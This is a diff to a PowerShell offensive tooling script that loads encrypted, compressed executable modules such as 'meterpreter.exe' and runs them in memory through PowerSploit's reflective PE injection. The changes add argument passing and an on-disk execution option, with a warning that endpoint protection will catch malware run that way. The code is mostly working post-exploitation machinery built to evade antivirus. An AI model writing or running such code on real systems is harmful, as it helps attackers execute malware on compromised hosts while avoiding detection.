@@ -192,12 +192,27 @@ function Run-Exe {
 
 Executes a loaded exe module in memory using Invoke-ReflectivePEInjection, which must be loaded first.
 
+.PARAMETER Module
+
+An integer reference the module to execute or the module object itself. Use List-HubModules to find this integer.
+
+.PARAMETER ExeArgs
+
+A string containing arguments which are passed to the exe module.
+
+.PARAMETER OnDisk
+
+If this switch is enabled, the exe module will be copied to disk and executed conventionally.
+
+WARNING: Endpoint protection WILL catch malware this way.
+
 .EXAMPLE
 
 Run-Exe 47
 
 Description
 -----------
+
 Execute the exe module 47 in memory
 
 .EXAMPLE
@@ -210,24 +225,32 @@ Description
 Load the exe module with the name 'meterpreter.exe' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$false,Position=1)] [String] $ExeArgs,
+        [parameter(Mandatory=$false)] [Switch] $OnDisk
     )
 
-    if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
-    {
+    if ($OnDisk) {
         foreach ($n in $Module) {
-            if ($n.gettype() -eq [Int32]) {
-                $code = $Modules[$n]["code"]
-            } else {
-                $code = $n["code"]
-            }
-            $code = [System.Convert]::FromBase64String($code)
-            $code = Decrypt-Code $code $KEY
-            $code = Unzip-Code $code
-            Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
+            $Filename = Save-HubModule $n -Directory $env:TMP
+            Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
         }
     } else {
-        Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
+        if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
+            foreach ($n in $Module) {
+                if ($n.gettype() -eq [Int32]) {
+                    $code = $Modules[$n]["code"]
+                } else {
+                    $code = $n["code"]
+                }
+                $code = [System.Convert]::FromBase64String($code)
+                $code = Decrypt-Code $code $KEY
+                $code = Unzip-Code $code
+                Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
+            }
+        } else {
+            Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
+        }
     }
 }
 
@@ -275,6 +298,7 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
             $Filename = $m["shortname"]
         }
         $code | Set-Content "$Filename" -Encoding Byte
+        $Filename
     }
 }
 
@@ -305,7 +329,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
 
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
-        [parameter(Mandatory=$false)] [string[]] $Arguments
+        [parameter(Mandatory=$false)] [String[]] $Arguments
     )
 
     foreach ($n in $Module) {
